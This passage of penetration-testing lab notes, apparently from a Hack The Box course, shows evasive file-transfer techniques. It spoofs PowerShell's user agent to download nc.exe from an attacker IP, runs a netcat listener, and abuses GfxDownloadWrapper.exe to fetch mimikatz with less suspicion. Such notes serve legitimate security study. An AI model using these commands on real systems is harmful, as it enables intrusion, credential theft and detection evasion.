### Changing User Agent
Invoke-WebRequest contains a UserAgent parameter, which allows for changing the default user agent to one emulating internet explorer, firefox, Chrome, Opera, or Safari. for example if Chrome is used internally, setting this user agent may make the request seem legitimate.

List agents with the following
```
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

##### Request with Chrome User Agent
```
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

(on attackbox)
```
n00blyfe@htb$ nc -lvnp 80
listening on [any] 80 ...
connect to 10.10.10.32 from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

### LOLBAS / GTFOBins
sometimes LOLBAS and GTFOBins are the better option as the drum up less suspicion. For example GfxDownloadWrappe.exe can be used functionally as a wget, and isn't uncommon
```
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```